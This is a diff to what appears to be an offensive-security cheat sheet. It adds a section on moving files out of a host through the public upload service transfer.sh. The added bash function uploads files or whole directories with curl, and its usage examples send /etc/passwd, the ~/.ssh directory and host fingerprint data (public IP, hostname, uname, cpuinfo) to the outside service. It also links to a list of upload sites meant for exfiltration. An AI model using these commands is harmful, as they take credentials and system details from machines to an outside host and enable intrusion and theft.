@@ -41,6 +41,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
    1. [File transfer without curl](#burl)
+   1. [File transfer for transfer.sh](#trans) 
    1. [File transfer using WebDAV](#webdav)
    1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
@@ -896,8 +897,31 @@ burl() {
 # PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
 ```
 
+<a id="trans"></a>
+### 4.vii. File transfer using a public dump
+
+Cut & paste into your bash:
+```sh
+transfer() {
+    local fn
+    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
+    [[ ! -t 0 ]] && { curl -SsfL --progress-bar --upload-file "-" "https://transfer.sh/${1}"; return; }
+    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
+    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar --upload-file "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
+    curl -SsfL --progress-bar --upload-file "$1" "https://transfer.sh/${1##*/}"
+}
+```
+
+then upload a file or a directory:
+```sh
+transfer /etc/passwd  # A single file
+transfer ~/.ssh       # An entire directory
+(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
+```
+A list of our <A href="?cloudexfil">favorite public upload sites</A>.
+
 <a id="webdav"></a>
-### 4.vii. File transfer - using WebDAV
+### 4.viii. File transfer - using WebDAV
 
 On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
@@ -934,7 +958,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 <a id="tg"></a>
-### 4.viii. File transfer to Telegram
+### 4.ix. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
